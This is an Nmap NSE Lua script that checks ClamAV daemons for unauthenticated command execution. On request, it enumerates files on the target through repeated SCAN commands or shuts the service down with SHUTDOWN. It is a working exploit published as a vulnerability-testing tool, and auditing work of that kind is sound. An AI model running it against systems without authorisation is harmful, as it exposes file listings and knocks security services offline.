local shortport = require "shortport"
local vulns = require "vulns"
local nmap = require "nmap"
local stdnse = require "stdnse"
local table = require "table"
local io = require "io"
local string = require "string"
local comm = require "comm"

description = [[
Exploits ClamAV servers vulnerable to unauthenticated clamav comand execution.

ClamAV server 0.99.2, and possibly other previous versions, allow the execution
of dangerous service commands without authentication. Specifically, the command 'SCAN'
may be used to list system files and the command 'SHUTDOWN' shut downs the
service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).

This script without arguments test the availability of the command 'SCAN'.

Reference:
* https://twitter.com/nitr0usmx/status/740673507684679680
* https://bugzilla.clamav.net/show_bug.cgi?id=11585
]]

---
-- @usage
-- nmap -sV --script clamav-exec <target>
-- nmap --script clamav-exec --script-args cmd='scan',scandb='files.txt' <target>
-- nmap --script clamav-exec --script-args cmd='shutdown' <target>
--
-- @output
-- PORT     STATE SERVICE VERSION
-- 3310/tcp open  clam    ClamAV 0.99.2 (21714)
-- | clamav-exec:
-- |   VULNERABLE:
-- |   ClamAV Remote Command Execution
-- |     State: VULNERABLE
-- |       ClamAV 0.99.2, and possibly other previous versions, allow the execution of the
-- |       clamav commands SCAN and SHUTDOWN without authentication. The command 'SCAN'
-- |       may be used to enumerate system files and the command 'SHUTDOWN' shut downs the
-- |       service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).
-- |
-- |     Disclosure date: 2016-06-8
-- |     Extra information:
-- |       SCAN command is enabled.
-- |     References:
-- |       https://bugzilla.clamav.net/show_bug.cgi?id=11585
-- |_      https://twitter.com/nitr0usmx/status/740673507684679680
-- @xmloutput
-- <table key="NMAP-1">
-- <elem key="title">ClamAV Remote Command Execution</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="description">
-- <elem>ClamAV 0.99.2, and possibly other previous versions, allow the execution
-- of the &#xa;clamav commands SCAN and SHUTDOWN without authentication.
-- The command &apos;SCAN&apos; &#xa;may be used to enumerate system files and
-- the command &apos;SHUTDOWN&apos; shut downs the &#xa;service.
-- This vulnerability was discovered by Alejandro Hernandez (nitr0us).&#xa;</elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="year">2016</elem>
-- <elem key="day">8</elem>
-- <elem key="month">06</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2016-06-8</elem>
-- <table key="extra_info">
-- <elem>SCAN command is enabled.</elem>
-- </table>
-- <table key="refs">
-- <elem>https://bugzilla.clamav.net/show_bug.cgi?id=11585</elem>
-- <elem>https://twitter.com/nitr0usmx/status/740673507684679680</elem>
-- </table>
-- </table>
--
-- @args clamav-exec.cmd Command to execute. Option: scan and shutdown
-- @args clamav-exec.scandb Database to file list.
---

author = "Paulino Calderon <calderon()websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "vuln"}

portrule = shortport.port_or_service(3310, "clam")

local function shutdown(host, port)
  local status, data = comm.exchange(host, port, "SHUTDOWN")
  if not status and data == "EOF" then
    stdnse.debug1("Expected EOF response to SHUTDOWN command:%s", data)
    return true
  end
  return nil
end

---
-- scan(host, port, file)
-- Sends SCAN %FILE command to clamav.
-- If no file is specified, we query a non existing file to check the response.
--
local function scan(host, port, file)
  local status, data

  if not file then
    status, data = comm.exchange(host, port, "SCAN /trinity/loves/nmap")
    if not status then
      stdnse.debug1("Failed to send SCAN command:%s", data)
      return nil
    end

    if data and data:match("No such file") then
      stdnse.debug1("SCAN command enabled.")
      return true, nil
    end
  else
    status, data = comm.exchange(host, port, "SCAN " .. file)
    if not status then
      stdnse.debug1("Failed to send 'SCAN %s' command:%s", file, data)
      return nil
    end
    if data and data:match("OK") then
        stdnse.debug1("File '%s' exists", file)
        return true, true
      else
        stdnse.debug1("File '%s' does not exists", file)
        return true, nil
      end
  end

  return nil
end

local function check_clam(host, port)
  local status, data = comm.exchange(host, port, "PING")
  if not status then
    stdnse.debug1("Failed to send PING command:%s", data)
    return nil
  end
  if data and data:match("PONG") then
    stdnse.debug1("PONG response received")
    return true
  end
  return nil
end

action = function(host, port)
  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or nil
  local scandb = stdnse.get_script_args(SCRIPT_NAME..".scandb") or nil

  if cmd == "scan" and not scandb then
    return "The argument 'scandb' must be set if we are using the command 'SCAN'"
  end

  --Check the service and update the port table
  local clamchk = check_clam(host, port)
  if clamchk then
    stdnse.debug1("ClamAV daemon found")
    port.version.name = "clam"
    port.version.product = "ClamAV"
    nmap.set_port_version(host, port)
  end

  local vuln = {
    title = 'ClamAV Remote Command Execution',
    state = vulns.STATE.NOT_VULN,
    description = [[
ClamAV 0.99.2, and possibly other previous versions, allow the execution of the
clamav commands SCAN and SHUTDOWN without authentication. The command 'SCAN'
may be used to enumerate system files and the command 'SHUTDOWN' shut downs the
service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).
]],
    references = {
      'https://bugzilla.clamav.net/show_bug.cgi?id=11585',
      'https://twitter.com/nitr0usmx/status/740673507684679680'
    },
    dates = {
      disclosure = {year = '2016', month = '06', day = '8'},
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local status, files = nil

  if cmd == "scan" then
    local file = io.open(scandb, "r")
    if not file then
      stdnse.debug1("Couldn't open file '%s'", scandb)
      return nil
    end
    local files = {}
    local exists
    while true do
      local db_line = file:read()
      if not db_line then
        break
      end
      status, exists = scan(host, port, db_line)
      if status and exists then
        table.insert(files, string.format("%s - FOUND!", db_line))
      end
    end
    if #files > 0 then
      vuln.extra_info = stdnse.format_output(true, files)
      vuln.state = vulns.STATE.VULN
    end
  elseif cmd == "shutdown" then
    status = shutdown(host, port)
    if status then
      vuln.extra_info = "SHUTDOWN command sent successfully."
      vuln.state = vulns.STATE.VULN
    end
  else
    status, files = scan(host, port, nil)
    if status then
      vuln.extra_info = "SCAN command is enabled."
      vuln.state = vulns.STATE.VULN
    end
  end

  return vuln_report:make_output(vuln)
end
